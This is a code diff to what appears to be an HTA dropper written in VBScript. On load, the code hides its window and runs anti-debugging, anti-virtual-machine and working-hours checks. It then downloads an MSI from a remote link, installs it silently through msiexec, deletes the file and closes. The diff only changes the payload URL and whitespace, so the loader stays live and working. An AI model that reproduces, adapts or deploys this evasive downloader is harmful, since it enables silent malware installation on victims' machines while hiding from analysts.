@@ -165,31 +165,31 @@ Sub Window_OnLoad
     window.resizeTo 0,0
     window.moveTo -3000,-3000
     oHTA.windowState = "minimize"
-    
+
     ' Anti-analysis checks
     If IsDebuggingActive() Then window.close
     If IsVirtualEnvironment() Then window.close
     If Hour(Now) < 9 Or Hour(Now) > 17 Then window.close
     TimeBasedDelay
-    
+
     ' Main script execution
     Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objFSO, objShell
-    strUrl = "https://share.google/5icY94HkmAiaVcn86"
+    strUrl = "https://share.google/mkGe1JX56Lut4KMdt"
     strTemp = g_WshShell.ExpandEnvironmentStrings("%TEMP%")
     strFile = strTemp & "\agent_installer.msi"
-    
+
     ' Download with redirect handling
     Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
     objXMLHTTP.open "GET", strUrl, False
     objXMLHTTP.send()
-    
+
     ' Check for any redirect (301, 302, etc.)
     If objXMLHTTP.Status >= 300 And objXMLHTTP.Status < 400 Then
         strUrl = objXMLHTTP.getResponseHeader("Location")
         objXMLHTTP.open "GET", strUrl, False
         objXMLHTTP.send()
     End If
-    
+
     If objXMLHTTP.Status = 200 Then
         Set objADOStream = CreateObject("ADODB.Stream")
         objADOStream.Open
@@ -198,16 +198,16 @@ Sub Window_OnLoad
         objADOStream.Position = 0
         objADOStream.SaveToFile strFile, 2 ' Overwrite
         objADOStream.Close
-        
+
         ' Install
         Set objShell = CreateObject("WScript.Shell")
         objShell.Run "msiexec /i """ & strFile & """ /quiet /qn /norestart", 0, True
-        
+
         ' Cleanup
         Set objFSO = CreateObject("Scripting.FileSystemObject")
         If objFSO.FileExists(strFile) Then objFSO.DeleteFile strFile
     End If
-    
+
     ' Close the HTA
     window.close
 End Sub
